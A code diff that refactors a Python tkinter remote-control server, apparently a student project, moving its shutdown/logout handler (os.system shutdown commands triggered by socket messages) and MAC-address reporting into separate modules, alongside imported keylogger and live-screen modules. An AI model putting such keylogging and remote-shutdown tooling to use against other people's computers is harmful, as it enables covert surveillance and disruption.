@@ -1,15 +1,11 @@
 import tkinter as tk
-import socket, uuid
-import os
+import socket
 import keylogger_server as kl 
 import app_process_server as ap
-import socket, pickle, PIL.ImageGrab, psutil, struct, uuid
-import os, json, re, winreg, threading, subprocess
-import numpy as np
-from pynput.keyboard import Listener
-import keylogger_server as kl 
 import directory_tree_server as dt
 import live_screen_server as lss
+import mac_address_server as mac
+import shutdown_logout_server as sl
 
 main = tk.Tk()
 main.geometry("200x200")
@@ -26,16 +22,13 @@ def keylogger():
     return
 
 def shutdown_logout():
-    msg = client.recv(BUFSIZ).decode("utf8")
-    if "SHUTDOWN" in msg:
-        os.system('shutdown -s -t 15')
-    elif "LOGOUT" in msg:
-        os.system('shutdown -l')
+    global client
+    sl.shutdown_logout(client)
     return
 
 def mac_address():
     global client
-    client.sendall(bytes(hex(uuid.getnode()), "utf8"))
+    mac.mac_address(client)
     return
 
 def app_process():
